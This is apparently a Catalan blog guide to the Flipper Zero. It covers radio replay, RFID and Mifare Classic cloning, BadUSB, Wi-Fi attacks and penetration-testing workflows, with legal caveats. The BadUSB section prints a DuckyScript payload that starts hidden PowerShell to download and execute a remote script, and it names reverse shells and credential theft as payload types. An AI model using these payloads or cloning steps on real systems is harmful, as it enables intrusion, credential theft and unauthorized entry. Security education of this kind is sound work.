---
title: "Flipper Zero: guia completa per a hackers i makers"
draft: false
toc: true
date: 2023-05-26
lastmod: 2026-11-27
description: "Guia de Flipper Zero sobre ràdio, protocols, firmware, GPIO, BadUSB, proves de seguretat, límits legals i accessoris."
genre: ["Pirateria de maquinari", "Ciberseguretat", "Proves de penetració", "Seguretat sense fils", "Exercicis d’equip vermell"]
tags: ["Flipper Zero (multieina de seguretat)", "pirateria de maquinari", "subgigahertz", "tecnologia NFC", "tecnologia RFID", "infraroig", "clau iButton", "BadUSB (suplantació de teclat USB)", "pins GPIO", "Bluetooth sense fils", "firmware Unleashed", "firmware Xtreme", "firmware RogueMaster", "placa de desenvolupament WiFi", "proves de penetració", "equip vermell", "seguretat sense fils", "clonació RFID", "targeta Mifare Classic", "estàndard RFID EM4100", "estàndard de proximitat HID Prox", "atac de repetició", "força bruta", "accessoris Flipper Zero", "codi obert", "auditoria de seguretat", "seguretat física", "enginyeria social", "competició de seguretat CTF", "firmware Flipper Zero", "aplicacions Flipper Zero", "repetició Sub-GHz", "estàndard de clau de seguretat U2F", "legalitat de Flipper Zero", "anàlisi de freqüències", "pirateria UART", "bus de comunicació SPI", "bus de comunicació I2C", "interfície de depuració JTAG", "interfície de depuració SWD", "GPIO de Flipper Zero", "WiFi de Flipper Zero", "Bluetooth de Flipper Zero", "NFC de Flipper Zero", "RFID de Flipper Zero", "IR de Flipper Zero", "guia Flipper Zero 2026"]
cover: "/img/cover/A_colorful_illustration_of_a_Flipper_Zero_device.webp"
coverAlt: "Il·lustració acolorida d'un dispositiu Flipper Zero amb diverses eines i senyals sense fils que n'expressen la versatilitat"
coverCaption: ""
---

**Flipper Zero** és l'eina múltiple més reconeixible de la comunitat de seguretat pràctica. Cap a una butxaca, costa uns 170 dòlars i integra una ràdio subgigahertz, lector RFID de 125 kHz, antena NFC, transceptor infraroig, port iButton, ràdio Bluetooth, capçalera d'expansió GPIO i port USB en un dispositiu que es pot penjar del clauer. Aquesta guia explica les seves capacitats, des de treure'l de la caixa fins a operacions avançades d’equip vermell.

*Si acabes de començar amb Flipper Zero, segueix les seccions en ordre. Si ja en tens un, ves directament al subsistema que t'interessa.*

## Visió general del maquinari

El **Flipper Zero** funciona amb un microcontrolador STM32WB55. És un xip Arm Cortex-M4 / Cortex-M0+ de doble nucli amb ràdio Bluetooth 5.0 integrada. L'aplicació principal s'executa al nucli M4 fins a 64 MHz; el nucli M0+ gestiona la pila Bluetooth.

| Element | Detalls |
|-----------|---------|
| **MCU** | STM32WB55RGV6, Cortex-M4 a 64 MHz + Cortex-M0+ |
| **flaix** | 1 MB intern + SPI NOR extern de 256 Mbit |
| **RAM** | 256 KB SRAM |
| **Pantalla** | E-paper d'1,4 polzades (128x64), sempre encesa |
| **Ràdio subgigahertz** | Transceptor CC1101, 300–928 MHz |
| **RFID** | Front-end analògic de 125 kHz (EM4100, HID, Indala i més) |
| **NFC** | ST25R3916B, ISO 14443A/B a 13,56 MHz i 15693 |
| **infraroig** | LED emissor de 940 nm + sensor receptor TSOP75338 |
| **iButton** | Interfície 1-Wire, DS1990A i claus de memòria tàctil |
| **Bluetooth** | BLE 5.0 (integrat a STM32WB55) |
| **GPIO** | Capçalera de 18 pins: SPI, I2C, UART, alimentació de 5V/3,3V i ADC |
| **USB** | USB-C, suport de dispositiu HID (BadUSB / U2F) |
| **Bateria** | Li-Po de 2000 mAh, càrrega USB-C, unes 30 hores en ús habitual |
| **MicroSD** | Fins a 128 GB, FAT32 o exFAT |

La **pantalla e-paper** no consumeix energia quan mostra una imatge fixa. Per això la bateria dura molt en espera continuada.

El **CC1101** és un transceptor subgigahertz d'ús general de Texas Instruments que cobreix els rangs 300–348 MHz, 387–464 MHz i 779–928 MHz. Es pot programar, i això dona flexibilitat al mòdul subgigahertz.

## Opcions de microprogramari

Pots fer servir el **microprogramari oficial de Flipper Zero** o diverses bifurcacions comunitàries. Cada bifurcació habilita funcions que Flipper dispositius limita per motius normatius i legal.

| microprogramari | Descripció | Funcions principals |
|----------|-------------|--------------------|
| **Oficial** | microprogramari original de Flipper dispositius | Valors predeterminats prudents i segurs |
| **Unleashed** | Bifurcació popular, centrada en l'estabilitat | Totes les freqüències subgigahertz i protocols addicionals |
| **Xtreme** | Moltes funcions i manteniment actiu | Interfície personalitzada, aplicacions i opcions subgigahertz |
| **RogueMaster** | Inclou moltes aplicacions de tercers | El paquet més gran d'aplicacions des del primer moment |

Instal·la qualsevol bifurcació carregant-la amb l'aplicació d'escriptori **qFlipper** a finestra, macOS o Linux, o copiant un fitxer `.dfu` a la targeta SD i usant el menú d'actualització del dispositiu.

*Unleashed és un punt de partida prudent per a la recerca. Xtreme agrada a qui vol més funcions. Quan viatgis, fes servir el microprogramari oficial per reduir complicacions legal.*

## Ràdio subgigahertz

El mòdul subgigahertz és una de les funcions més conegudes. Permet enregistrar, analitzar, repetir i transmetre senyals en les freqüències de portes de garatge, comandaments de cotxe, timbres, estacions meteorològiques, endolls sense fils i molts altres dispositius.

### Rangs de freqüència compatibles

- **300–348 MHz** — comandaments antics i alguns sistemes de garatge dels EUA
- **387–464 MHz** — dispositius europeus i nord-americans; 433,92 MHz és la banda ISM global més habitual
- **779–928 MHz** — 868 MHz (Europa), 915 MHz (banda ISM dels EUA) i 868 MHz LoRa

### Esquemes de modulació habituals

| Modulació | Significat |
|------------|------------|
| **AM (ASK/OOK)** | Modulació d'amplitud; senyal senzill d'encesa/apagada, habitual en comandaments simples. |
| **FM (FSK/2-FSK)** | Modulació de freqüència, usada per estacions meteorològiques i alguns comandaments de cotxe. |
| **APSK** | Combinació de modulacions, usada per pocs dispositius intel·ligents. |

El Flipper descodifica senyals OOK en brut automàticament. Els mostra a la pantalla i permet repetir-los amb un botó. Això va fer famós Flipper Zero: **repetir codis estàtics** és molt fàcil en dispositius que no fan servir codis variables.

### Codi variable i codi estàtic

Els dispositius de **codi estàtic** transmeten el mateix senyal cada vegada. Flipper Zero el pot enregistrar i tornar a transmetre. Molts endolls sense fils econòmics, timbres i portes de garatge antigues fan servir codis estàtics.

Els dispositius de **codi variable** (KeeLoq, AUT64 i altres) canvien el codi després de cada ús. Un senyal capturat no es pot repetir directament. Els atacs són més complexos i necessiten eines especialitzades i sincronització de proximitat. Flipper Zero no supera els codis variables moderns tal com ve de fàbrica.

*Limita les proves als dispositius que et pertanyen. Els dispositius de codi estàtic de casa teva són un bon objectiu d'aprenentatge.*

### Flux de treball subgigahertz

1. Obre **subgigahertz** al menú principal.
2. Tria **Read** (opció per llegir i captar el senyal) per capturar un senyal. Apunta el dispositiu cap al comandament i prem-ne un botó.
3. Flipper descodifica el senyal i mostra la freqüència, la modulació i el patró de bit en brut.
4. Prem **Save** (desar el senyal) per desar-lo a la targeta SD.
5. Prem **Send** (opció per retransmetre el senyal) o obre el fitxer desat més tard per retransmetre'l.

El mode **Frequency Analyzer** (analitzador de freqüències) escaneja l'espectre passivament i mostra les freqüències actives. Serveix per localitzar transmissors desconeguts.

### Atacs de força bruta

Amb protocols d'espai de claus petit (com alguns comandaments antics amb codis estàtics de 12 o 24 bit), Flipper pot provar totes les combinacions amb una seqüència de **per aça bruta**. Això pot funcionar contra dispositius molt antics o econòmics, però no serveix contra codis variables ni espais de claus grans.

El microprogramari personalitzat inclou diccionaris addicionals i seqüències específiques de fabricants. S'hi troben habitualment **Came 12bit**, **Nice 12bit**, **Linear 8bit** i **Holtek 12bit**.

## RFID (baixa freqüència de 125 kHz)

El mòdul **RFID de 125 kHz** llegeix i escriu targetes de proximitat de baixa freqüència, emprades en sistemes d'accés antics, microxips d'animals i seguiment industrial.

### Tipus de targeta compatibles

| Tipus de targeta | Notes |
|------------------|-------|
| **EM4100 / EM4102** | Molt habitual, només lectura de 64 bit; sistemes d'accés econòmics. |
| **HID Prox** | popular en control d'accés comercial (HID Global H10301 i variants). |
| **Indala Prox** | format Motorola / Indala per a sistemes antics. |
| **IoProx** | Kantech IoProx, també habitual en edificis comercials nord-americans. |
| **FDX-B (ISO 11784/11785)** | Estàndard de microxips per a animals. |
| **Pyramid** | Farpointe dades; semblant a Indala. |
| **Viking** | Menys habitual, present en alguns sistemes europeus. |

### Lectura d'una targeta LF

Acosta la vora superior del Flipper, on hi ha l'antena, a pocs centímetres de la targeta o del clauer. Obre el menú **125 kHz RFID > Read** (ruta per llegir una targeta RFID). L'opció Read (llegir) llegeix la targeta LF i en mostra l'identificador. El dispositiu llegeix l'identificador en un o dos segons i mostra el codi de la instal·lació i el número de targeta.

### Emulació i clonació

Després de llegir la targeta, desa-la i més tard **emula-la** seleccionant el fitxer i prement el botó. Flipper transmet l'identificador perquè el lector la vegi com la targeta original.

També pots **escriure** l'identificador en una targeta T5577 en blanc. Aquestes targetes regravables costen aproximadament 0,50 dòlars i admeten la majoria de format de baixa freqüència.

*Clonar targetes d'accés que no et pertanyen o que no tens autorització per provar és delicte en la majoria de jurisdiccions. Demana sempre autorització escrita abans d'avaluar un sistema de control d'accés.*

### Límits de l'RFID LF

L'RFID de baixa freqüència no té protecció criptogràfica. Qualsevol persona amb un lector a prop pot llegir l'identificador de la targeta. La seguretat física moderna fa servir targetes intel·ligents d'alta freqüència (NFC de 13,56 MHz) amb autenticació mútua.

## NFC (alta freqüència de 13,56 MHz)

El **mòdul NFC** fa servir el xip ST25R3916B i és compatible amb ISO 14443A, ISO 14443B i ISO 15693. Aquesta és la freqüència de les targetes de pagament sense contacte, de transport, d'accés a edificis i de les etiquetes NFC.

### Estàndards compatibles

| Estàndard | Ús habitual |
|-----------|-------------|
| **ISO 14443A** | Mifare Classic, Mifare DESfire, NXP NTAG i targetes de crèdit/dèbit |
| **ISO 14443B** | Alguns documents oficials i passaports (capa exterior) |
| **ISO 15693** | Etiquetes de biblioteques i alguns RFID industrials |
| **EMV (nivell 1)** | Lectura només de les metadades de pagament sense contacte |
| **NFC-A/B/F/V** (estàndards d’intercanvi de dades NFC) | protocols generals d’intercanvi de dades NFC |

### Atacs a Mifare Classic

**Mifare Classic** és un estàndard de targeta intel·ligent de 13,56 MHz que es va trencar teòricament el 2008. Encara l'utilitzen sistemes antics de transport i accés a edificis. Flipper Zero disposa de diverses tècniques:

- **Read** (llegir) — llegeix els sectors amb la clau predeterminada (`FFFFFFFFFFFF` o `A0A1A2A3A4A5`).
- **diccionari atac** — prova una llista de claus habituals contra sector bloquejats. El microprogramari personalitzat inclou diccionaris extensos.
- **niat atac** — necessita almenys una clau de sector coneguda i usa criptoanàlisi basada en temporització per obtenir-ne d'altres.
- **Darkside atac** — en algunes versions de Mifare Classic funciona sense cap clau coneguda. Cal situar Flipper a menys d'un centímetre de la targeta.

Quan s'han llegit tots els sector, desa el bolcat complet i **emula** la targeta, incloses les dades dels sector.

*No clonïs targetes Mifare Classic amb saldo (bitllets de transport o crèdit d'aparcament) tret que controlis tant la targeta com el sistema del darrere.*

### Mifare DESfire i targetes modernes

Les targetes **Mifare DESfire EV1/EV2/EV3** fan servir xifratge AES-128 i autenticació mútua. Flipper Zero no pot llegir-ne les dades protegides. Pot llegir l'UID i la llista AID, però no accedeix a les dades de les aplicacions sense les claus correctes. És el comportament previst: DESfire és segur.

Les **targetes de pagament EMV** — Visa, Mastercard i Amex sense contacte — poden exposar metadades públiques (número en targetes antigues, caducitat i registre de transaccions). Les targetes modernes retornen menys dades en la lectura pública. Flipper no pot iniciar ni interceptar pagaments reals.

### Etiquetes NFC i NDEF

**NDEF (format d’intercanvi de dades NFC)** és el format estàndard per a etiquetes NFC de màrqueting, autenticació de productes i etiquetes intel·ligents. Flipper pot llegir, desar, escriure i emular etiquetes NDEF. Això serveix per:

- Clonar etiquetes NXP NTAG203 o NTAG213 en proves autoritzades
- Escriure contingut NDEF (URL, targetes de contacte o credencials Wi-Fi)
- Emular una etiqueta perquè un telèfon executi una acció sense l'etiqueta física

## Infraroig (IR)

El mòdul d'infraroig té un LED emissor de 940 nm i un demodulador TSOP75338 receptor. És compatible amb gairebé tots els protocols de comandaments infrarojos de consum.

### protocols descodificats

| protocol | Dispositius habituals |
|----------|-----------------------|
| **NEC** | El més habitual; LG, Samsung, Panasonic i molts altres |
| **RC5** | Dispositius Philips |
| **RC6** | Philips, Microsoft i descodificadors de TV |
| **Samsung32** | Televisors i equips de cinema a casa Samsung |
| **NECext** | NEC ampliat amb adreces de 32 bit |
| **SIRC12 / SIRC15 / SIRC20** | Dispositius Sony |
| **Kaseikyo** | Panasonic i JVC |
| **RCA** | Comandaments de la marca RCA |

Flipper també captura i repeteix **senyals infraroig en brut** quan no pot descodificar el protocol. La captura conserva els temps exactes dels polsos i les pauses.

### Comandament universal

L'aplicació integrada **Universal Remotes** permet consultar codis infraroig per marca i categoria. Pots apagar televisors, ajustar barres de so o controlar aparells d'aire condicionat sense el comandament original. La biblioteca infraroja que manté la comunitat a GitHub, `flipperzero-ir-relay`, inclou milers de codis addicionals.

*En una operació d’equip vermell o d’enginyeria social, el comandament infraroig pot crear distraccions en espais amb pantalles visibles.*

### Captura del teu comandament

1. Ves a **Infrared > Learn New Remote** (infraroig > aprèn un comandament nou).
2. Apunta el comandament original a la finestra receptora infraroig del Flipper, a la vora superior.
3. Prem cada botó que vulguis capturar. Flipper desa cada botó per separat.
4. Posa nom al fitxer del comandament i desa'l.
5. Repeteix qualsevol botó des del fitxer desat.

## iButton i 1-Wire

**iButton** (Dallas/Maxim 1-Wire) és un protocol de contacte usat en alguns sistemes d'accés, seguiment d'actius i mesura de temperatura. El contacte iButton és el petit disc o cilindre metàl·lic que toca el lector.

### Tipus de clau compatibles

| Tipus de clau | Notes |
|---------------|-------|
| **DS1990A** | Clau d'accés comuna; identificador únic de 64 bit, només lectura |
| **DS1992** | Clau de memòria amb 1 KB de NVRAM |
| **DS1996** | Clau de memòria amb 64 KB de NVRAM |
| **Cyfral** | format de sistemes d'accés d'Europa oriental |
| **Metacom** | format d'intercomunicació menys habitual |

Per llegir una clau, toca-hi el port iButton del Flipper, les plaques daurades de la vora inferior. Desa-la i emula-la com una targeta RFID o NFC. Flipper també pot escriure identificadors en claus iButton RW1990 en blanc.

## GPIO i pirateria de maquinari

La **capçalera GPIO de 18 pins** de la part superior és la interfície principal per a projectes de maquinari. Exposa SPI, I2C, UART, ADC i línies d'alimentació.

### Pinout GPIO

| pin | Funció |
|-----|--------|
| **1** | 5V (entrada, des d'USB només quan està connectat) |
| **2, 4** | GND |
| **3** | Sortida de 3,3V (màxim 20 mA) |
| **5** | PA4 / SPI1_MISO / ADC |
| **6** | PA6 / SPI1_SCK |
| **7** | PA7 / SPI1_MOSI |
| **8** | PA3 / UART TX |
| **9** | PB3 / UART RX |
| **10** | PC3 / ADC |
| **11** | PC1 / ADC |
| **12** | PA0 / ADC |
| **13** | PB2 / GPIO |
| **14** | PE3 / SPI1_CS |
| **15** | PB4 / I2C1_SDA |
| **16** | PB13 / I2C1_SCL |
| **17** | PB14 / GPIO / USART1 TX (depuració) |
| **18** | PA8 / GPIO |

*Tots els pins GPIO funcionen amb lògica de 3,3V. No apliquis 5V als pins de dades. Fes servir un convertidor de nivell per a dispositius de 5V.*

### Accés a la consola UART

Molts dispositius incrustats deixen activa una consola de depuració UART en producció. Connectar els pins UART del Flipper a TX/RX UART del dispositiu permet accedir a una consola sèrie i, en alguns casos:

- Obrir un intèrpret d'ordres amb privilegis
- Observar el registre d’arrencada i trobar credencials o informació del sistema
- Carregar microprogramari sense signar si el carregador permet accedir al menú

Ves a **GPIO > USB-UART Bridge** (menú GPIO per obrir un pont USB a UART) o obre una connexió de terminal des de l’aplicació GPIO. Flipper apareix a l’ordinador com un port sèrie USB i fa de pont amb els pins UART.

### sensors SPI i I2C

Connecta directament a la capçalera GPIO qualsevol sensor SPI o I2C (acceleròmetre, sensor de pressió, sensor de temperatura/humitat o pantalla OLED). Hi ha aplicacions comunitàries per a molts xips:

- Controlador de pantalla OLED **SSD1306**
- Temperatura, humitat i pressió amb **BME280**
- Mòdul de ràdio de 2,4 GHz **NRF24L01** (amplia la superfície d'atac sense fils)
- Antena externa **CC1101** per millorar l'abast subgigahertz

### Depuració JTAG i SWD

La capçalera GPIO exposa senyals SWD en alguns pins. Amb un adaptador, Flipper pot fer de **sonda de depuració JTAG/SWD** per:

- Aturar i executar pas a pas codi d’un MCU
- Llegir i escriure memòria flaix
- Intentar extreure microprogramari de dispositius bloquejats amb glitching de tensió i accés de depuració

És un ús avançat. El port de microprogramari **BlackMagic sonda** per a Flipper facilita aquest flux de treball.

{{< figure src="flipper-zero-gpio-uart-jtag-swd-hardware-attack-surface-diagram.webp" alt="Diagrama de la capçalera GPIO de Flipper Zero amb connexions UART, SPI, I2C, JTAG i SWD a dispositius incrustats" >}}

## BadUSB i atacs USB HID

En connectar-lo a un ordinador per USB-C, Flipper Zero s'identifica com un **teclat USB HID**. Aquesta és la via BadUSB: el dispositiu introdueix pulsacions de tecles sense instal·lar controladors.

### DuckyScript

Els scripts BadUSB de Flipper fan servir **DuckyScript**, el mateix llenguatge de scripts que USB Rubber Ducky de Hak5. El script és un fitxer de text a `badusb/` de la targeta SD.

```
REM Obre el quadre Executar i inicia PowerShell
DELAY 500
GUI r
DELAY 300
STRING powershell -NoP -W Hidden -Exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/payload.ps1')"
ENTER
```

Tipus habituals de càrregues BadUSB:

- **intèrpret d'ordres invers** — obre una connexió de xarxa cap a l'equip atacant
- **Extracció de credencials** — executa Mimikatz o eines semblants en memòria
- **Persistència** — afegeix una entrada d'inici o una tasca programada
- **Extracció de contrasenyes Wi-Fi** — exporta perfils desats amb `netsh`
- **Injecció de clau SSH** — afegeix una clau d'atacant a `authorized_keys`

### defenses contra BadUSB

L'atac funciona perquè els ordinadors confien en els teclats per defecte. Algunes defenses:

- **USBGuard** (Linux) — permet només dispositius USB amb identificador de fabricant/producte aprovat
- **Política de bloqueig USB** (finestra) — desactiva HID de fabricants no autoritzats
- **Bloquejadors físics de ports** — impedeixen connectar USB en entorns d'alta seguretat
- **Detecció de punts finals** — eines com CrowdStrike poden detectar patrons d'injecció ràpida de tecles

### Token de maquinari U2F

Flipper Zero també pot actuar com a **clau de seguretat FIDO U2F**. El microprogramari oficial inclou suport U2F. Registra Flipper en un lloc compatible amb FIDO U2F (GitHub, Google, Cloudflare i altres) i prem el botó posterior per confirmar l'autenticació.

Així Flipper pot ser un token per als teus comptes. Desa el material de clau privada en l'emmagatzematge segur del MCU.

## Bluetooth

L'STM32WB55 inclou Bluetooth 5.0. Flipper fa servir BLE per a:

- **Flipper Mobile App** — aplicació iOS i Android per gestionar fitxers, actualitzar microprogramari i controlar el dispositiu
- **BadBT** (aplicació comunitària) — envia pulsacions DuckyScript per Bluetooth en lloc d'USB i permet injecció HID sense fils contra ordinadors aparellats
- **Escàner BLE** — escaneig passiu de publicitat BLE propera per inventariar dispositius IoT d'un edifici

L'abast Bluetooth és moderat (uns 10–30 metres a l'aire lliure). N'hi ha prou per a una entrega BadUSB sense fils des d'una bossa o una butxaca a prop d'una estació de treball.

### Aparellar l'aplicació mòbil

1. Baixa **Flipper Mobile App** de l’App Store o Google Play.
2. A Flipper, ves a **Settings > Bluetooth > Pair Phone** (menú per vincular el telèfon per Bluetooth).
3. Obre l'aplicació i segueix l'avís d'aparellament.
4. Usa-la per consultar la SD, instal·lar aplicacions del catàleg i rebre dades dels sensors.

## microprogramari personalitzat en profunditat

### microprogramari Unleashed

**Unleashed** (github.com/DarkFlippers/unleashed-firmware) és la bifurcació comunitària més conservadora. Elimina restriccions geogràfiques de freqüències subgigahertz i amplia els protocols, mantenint-se a prop del codi oficial. Prioritza l'estabilitat.

Afegeix respecte del microprogramari oficial:

- Rang subgigahertz ampliat (300–928 MHz sense restricció)
- Més protocols subgigahertz (CAME, Nice, DoorHan i altres)
- Més protocols NFC
- Més compatibilitat amb DuckyScript BadUSB
- Una base de dades infraroig més gran

### microprogramari Xtreme

**Xtreme** (github.com/Flipper-XFW/Xtreme-Firmware) afegeix un sistema complet d'actius personalitzats sobre les funcions d'Unleashed. Pots canviar el nom de Flipper, la pantalla inicial, les animacions i els LED. El menú Settings té moltes més opcions.

Funcions addicionals:

- aplicació Hub amb aplicacions de tercers seleccionades
- Càrregues d'atac subgigahertz i NFC ampliades
- Scripts per als LED RGB
- Millores en la gestió de fitxers

### RogueMaster

**RogueMaster** agrupa moltes aplicacions de tercers i eines comunitàries, algunes experimentals o arriscades en determinades situacions. És menys estable que Unleashed o Xtreme, però concentra més eines en una instal·lació.

### Instal·lar qualsevol microprogramari

```bash
# Fes servir la CLI de qFlipper
qFlipper cli -c firmware /path/to/firmware.dfu

# O bé posa firmware.zip a l’arrel de la targeta SD i després:
# Settings > Firmware Update > Update from SD Card (Configuració > Actualització del firmware > Actualitza des de la targeta SD)
```

*Fes una còpia de seguretat de la targeta SD abans d'actualitzar el microprogramari. L'actualització no l'esborra, però fer-ne còpia és una bona pràctica.*

## Ecosistema d'aplicacions Flipper

### Catàleg oficial d'aplicacions

El catàleg oficial de **lab.flipper.net** mostra aplicacions que pots instal·lar des de l'aplicació mòbil. Inclou categories com:

- Eines subgigahertz
- Utilitats NFC
- Jocs
- sensors GPIO
- Eines de desenvolupament
- Música i entreteniment

### Fonts comunitàries d'aplicacions

- **flipc.org** — base de dades comunitària de senyals subgigahertz capturats, bolcats NFC i bases infraroig ordenats per dispositiu
- **awesome-flipperzero** (GitHub) — llista seleccionada d'aplicacions, eines, scripts i complements de maquinari
- **UberGuidoZ Flipper** (GitHub) — gran repositori de captura subgigahertz classificades per protocol i fabricant

### Aplicacions de tercers destacades

| Aplicació | Funció |
|----------|--------|
| **Seader** | Llegeix dades PACS de targetes intel·ligents amb un mòdul compatible amb Wiegand |
| **POCSAG Pager** | Descodifica missatges de cercapersones POCSAG a 152–160 MHz |
| **iButton Fuzzer** | Prova per força bruta l'espai de claus iButton |
| **NFC Playlist** | Recorre automàticament una llista de targetes NFC |
| **T5577 Writer** | Escriu dades EM4100/HID en targetes T5577 en blanc |
| **BLE Spam** | Envia moltes trames publicitàries BLE a dispositius propers |
| **ESP32 WiFi Marauder** | Controla Wi-Fi Marauder en una placa Wi-Fi Dev Board ESP32 |
| **Metroflip** | Analitza i mostra dades de targetes de transport |
| **USB Mouse Jiggler** | Manté la pantalla activa amb moviments de ratolí HID |

## Accessoris i ampliacions de maquinari

### Wi-Fi Dev Board

La **Wi-Fi Dev Board** es connecta a la capçalera GPIO del Flipper. Conté un ESP32-S2 amb microprogramari **WiFi Marauder** i afegeix capacitats completes 802.11 b/g/n:

- **Escaneig SSID** — enumera punts d'accés propers
- **balisa brossa** — transmet molts SSID falsos i crea soroll visible
- **Atac de desautenticació** — envia trames 802.11 per desconnectar clients d'un punt d'accés
- **Captura de sonda** — captura peticions per identificar dispositius i SSID recordats
- **Atac WPS** — cerca encaminadors amb WPS i prova l'enumeració de pin (lenta)
- **Captura PMKID** — captura hash PMKID per provar-los fora de línia sense client

La placa es controla amb la pantalla i els botons del Flipper; no cal telèfon ni ordinador.

*Enviar trames de desautenticació contra xarxes que no controles és il·legal segons la CFAA dels EUA i normes equivalents de molts països. Fes-ho només en un laboratori autoritzat.*

### Mòdul de videojocs

El **vídeo joc mòdul** conté un RP2040 i una bateria recarregable petita. Es connecta a GPIO i afegeix jocs multijugador sense fils. També pot funcionar com a microcontrolador independent per executar codi personalitzat i descarregar feina de l'STM32 principal.

### Mòdul ESP32 WROOM (DIY)

Un **ESP32-WROOM-32** estàndard connectat per UART o SPI amplia encara més les possibilitats:

- Wi-Fi 802.11 complet amb microprogramari personalitzat
- Bluetooth Classic de 2,4 GHz i BLE simultanis amb el BLE del Flipper
- Ampliació GPIO externa
- Interfície de servidor web per controlar-lo a distància en intervencions físiques

### Adaptador GPIO per a Raspberry Pi Zero 2W

Adaptadors comunitaris connecten una **Raspberry Pi Zero 2W** a la capçalera GPIO. La Pi executa Linux complet i es comunica per UART o sèrie USB. Serveix per:

- Registrar dades durant molt de temps
- Executar Bettercap o Kismet per reconèixer xarxes
- Fer de relé C2 durant operacions d’equip vermell
- Emmagatzemar captura grans que superarien una microSD

{{< figure src="flipper-zero-wifi-devboard-esp32-raspberry-pi-gpio-accessories-overview.webp" alt="Accessoris de Flipper Zero: Wi-Fi Dev Board, mòdul ESP32 i adaptador GPIO per a Raspberry Pi Zero" >}}

## Fluxos de treball de proves de penetració

### Flux de treball per provar l'accés físic

1. Fes servir el **lector RFID de 125 kHz** per llegir targetes de personal quan les tinguis a prop en un vestíbul.
2. Clona la targeta en una T5577 en blanc o emula-la directament amb Flipper.
3. Fes servir la targeta clonada per entrar en zones protegides.
4. Documenta quins lectors han acceptat la credencial clonada i informa el client.



Això permet determinar si l'edifici depèn d'EM4100 (insegur i clonable) o de targetes NFC modernes (més difícils de clonar). Fes aquestes proves només amb autorització escrita i dins de l’abast acordat.

### Inventari de dispositius sense fils

1. Recorre les instal·lacions amb **Sub-GHz Frequency Analyzer** (analitzador de freqüències sub-GHz) en funcionament i amb autorització.
2. Anota les freqüències actives i els tipus de senyal.
3. Fes servir **Read** (opció per llegir i captar el senyal) per identificar senyals de sensors d'alarma, barreres d'aparcament i controladors HVAC dins l'abast.
4. Informa dels dispositius de codi estàtic com a troballes d'alta gravetat.

### Inspecció RFID

1. Usa **NFC > Detect Reader** (menú per detectar lectors fent que Flipper actuï com una targeta) perquè Flipper actuï com una targeta i detecti lectors sense portar credencials.
2. Identifica si els lectors admeten Mifare Classic, DESfire o ISO 15693 i avalua el nivell de seguretat dels punts d'accés.

### Simulació d'un atac BadUSB

1. Carrega prèviament una càrrega DuckyScript a la targeta SD de Flipper.
2. Deixa Flipper connectat a una estació de treball desbloquejada (cal accés físic).
3. L'script s'executa automàticament: enumera l'equip, exfiltra credencials i estableix una connexió de retorn.
4. Documenta el temps fins a l'execució i les taxes de detecció.



Això permet comprovar les polítiques de control USB i la detecció de punts finals. Fes la prova en un laboratori autoritzat i no recullis credencials.

### Proves de sensors d'alarma sense fils

Molts sensors de portes i finestres transmeten senyals OOK simples subgigahertz. En un laboratori autoritzat i si fan servir codis estàtics:

1. **Registra** el senyal del sensor en activar-lo de manera controlada.
2. **Repeteix** el senyal al banc de proves per simular-ne l'activació.
3. Comprova si el sistema d'alarma genera un avís.

Això mostra si un sensor perimetral sense fils necessita proteccions contra la repetició.

{{< figure src="flipper-zero-penetration-testing-physical-access-rfid-badusb-workflow-diagram.webp" alt="Diagrama de flux de proves de Flipper Zero per a control físics, inventari sense fils, inspecció RFID i detecció de BadUSB" >}}

## Usos en CTF i competicions

Flipper Zero apareix en competicions **captura el Flag** de seguretat física. Alguns reptes habituals:

- Clonar una targeta per obrir una caixa amb una bandera
- Repetir un senyal subgigahertz per obrir una porta simulada
- Descodificar un senyal infraroig per recuperar un missatge ocult
- Emular una etiqueta NFC per autenticar-se com un altre usuari
- Fer servir BadUSB per executar una càrrega en una màquina supervisada

El registre integrat i la capacitat de la targeta SD faciliten arxivar senyals recollits durant un CTF per analitzar-los després.

## Usos defensius

Els equips de seguretat poden auditar els seus entorns amb Flipper Zero:

- **Auditoria de targetes** — identifica sistemes EM4100 o Mifare Classic que caldria actualitzar a DESfire EV2 o superior.
- **Auditoria de dispositius sense fils** — inventaria dispositius subgigahertz i detecta sistemes de codi estàtic.
- **Prova de polítiques BadUSB** — verifica que el bloqueig de dispositius USB HID funciona.
- **Auditoria de comandaments infraroig** — comprova que equips sensibles no es controlin amb un comandament infraroig universal.
- **Prova de clonabilitat NFC** — determina si es poden clonar etiquetes NFC de productes o credencials dins d'una prova autoritzada.

## Consideracions legals i ètiques

Flipper Zero és una eina legítima de recerca de seguretat, però també es pot fer servir malament. L'exposició legal depèn de la jurisdicció i del context.

### Accions generalment legals amb autorització

- Provar dispositius que et pertanyen
- Fer proves de penetració autoritzades amb una declaració de treball signada
- Investigar en un laboratori controlat
- Llegir les teves pròpies targetes d'accés i comandaments
- Participar en competicions CTF autoritzades

### Accions generalment il·legals

- Repetir un senyal de porta de garatge aliè per entrar-hi
- Clonar una targeta que permet entrar en un edifici sense autorització
- Enviar trames de desautenticació contra una xarxa que no controles
- Fer servir BadUSB contra un ordinador sense permís escrit
- Interceptar comunicacions privades (subgigahertz o d'altres tipus) en la majoria de jurisdiccions

Als **Estats Units**, les lleis rellevants inclouen Computer Fraud and Abuse Act (CFAA), Electronic Communications Privacy Act (ECPA) i les normes de radiofreqüència de la Federal Communications Commission (FCC). A la **UE**, hi ha proteccions semblants en les lleis nacionals de delictes informàtics i la Directiva d'equips radioelèctrics.

*La FCC no prohibeix tenir o utilitzar un dispositiu que rebi senyals subgigahertz. Sí que prohibeix transmetre sense llicència en certes freqüències. Molts dispositius de consum fan servir bandes ISM sense llicència (315 MHz, 433 MHz, 915 MHz), i les potències baixes solen complir els límits de la Part 15.*

El Canadà va intentar bloquejar les importacions de Flipper Zero el 2024 per preocupacions sobre robatoris de cotxes. Va ser en gran part una resposta política a la cobertura mediàtica d'atacs de retransmissió de claus, no una preocupació tècnica precisa: els sistemes moderns d'entrada sense clau fan servir codis variables i Flipper no els supera sense maquinari addicional.

{{< figure src="flipper-zero-legal-framework-authorized-vs-illegal-use-cases-us-eu-cfaa-guidelines.webp" alt="Gràfic que compara usos autoritzats i il·legal de Flipper Zero segons la CFAA dels EUA i les lleis de la UE" >}}

## Configuració d'un entorn de desenvolupament

### Compilar el microprogramari oficial

```bash
git clone --recursive https://github.com/flipperdevices/flipperzero-firmware.git
cd flipperzero-firmware

# Instal·la la cadena d’eines (Linux/macOS)
./fbt

# Compila el firmware
./fbt fap_dist

# Flasheja per USB
./fbt flash_usb_full
```

